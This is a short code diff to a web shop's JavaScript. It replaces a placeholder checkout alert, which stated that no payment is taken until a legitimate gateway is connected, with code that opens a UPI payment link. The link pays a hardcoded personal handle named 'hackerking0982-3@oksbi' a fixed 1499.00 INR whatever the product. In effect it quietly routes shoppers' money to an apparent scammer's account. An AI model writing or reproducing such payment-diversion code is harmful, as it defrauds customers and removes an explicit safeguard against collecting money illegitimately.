@@ -176,7 +176,11 @@ function addToCart(id){
 function buyNow(id){
   const p=products.find(x=>x.id===id);
   if(!p) return;
-  alert('Buy Now: '+p.name+'\\n\\nCheckout is ready for a verified payment gateway, but no customer payment is collected until a legitimate gateway is connected.');
+  const upi='hackerking0982-3@oksbi';
+  const amount='1499.00';
+  const url='upi://pay?pa='+encodeURIComponent(upi)+'&pn='+encodeURIComponent('New Shop')+'&am='+amount+'&cu=INR&tn='+encodeURIComponent('Order '+p.name);
+  const w=window.open(url,'_blank');
+  if(!w) window.location.href=url;
 }
 
 function closeModal(){document.getElementById('modal').style.display='none';}
